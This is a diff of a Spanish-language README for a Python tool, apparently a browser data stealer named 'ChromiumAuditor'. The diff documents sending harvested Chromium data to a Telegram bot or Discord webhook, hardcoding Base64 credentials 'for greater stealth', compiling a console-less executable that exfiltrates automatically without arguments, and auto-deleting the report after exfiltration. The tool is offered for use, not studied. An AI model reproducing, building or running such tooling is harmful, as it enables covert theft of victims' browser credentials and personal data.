@@ -76,14 +76,15 @@ pip install -r requirements.txt
 python main.py -f html -o reporte_final
 ```
 
-> **Exfiltración Remota vía Telegram:**
+> **Exfiltración vía Telegram (Modo Rápido):**
 
 ```bash
-python main.py -t "TU_TOKEN" -c "TU_ID"
+python main.py -t "TOKEN" -c "ID" # Soporta Texto Plano o Base64
 ```
 
-> [!TIP]
-> **Uso Autónomo**: Puedes dejar estos campos vacíos si has rellenado las `CREDENCIALES HARDCODED` directamente en el código de `main.py`.
+### 🔑 Uso Autónomo (Hardcoding)
+
+Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en `main.py` (Se recomienda usar **Base64** para mayor sigilo). Una vez rellenadas, puedes ejecutar el `.exe` o el script sin parámetros y los datos se enviarán automáticamente.
 
 ---
 
@@ -98,15 +99,15 @@ pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
 
 ## 🚦 Panel de Argumentos CLI
 
-| Icono | Argumento | Descripción |
+| Corto | Largo | Descripción |
 | :--- | :--- | :--- |
-| 📄 | `-f`, `--format` | Formatos: `html` (interactivo) o `csv`. |
-| 📁 | `-o`, `--output` | Nombre base del archivo de salida. |
-| 🤖 | `-t`, `--telegram-token` | Token del bot (API Telegram). |
-| 🆔 | `-c`, `--telegram-chatid` | ID de chat (API Telegram). |
-| 🔗 | `-d`, `--discord` | URL del Webhook de Discord. |
-| 🧹 | `--no-wipe` | Desactiva el auto-borrado post-exfiltración. |
-| 🛠️ | `-v`, `--verbose` | Logs detallados en consola. |
+| `-f` | `--format` | Formato: `html` o `csv`. |
+| `-o` | `--output` | Nombre base del archivo de salida. |
+| **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
+| **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
+| **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
+| 🧹 | `--no-wipe` | Evita auto-borrado del reporte. |
+| 🛠️ | `-v` | Modo verboso (logs detallados). |
 
 ---
 
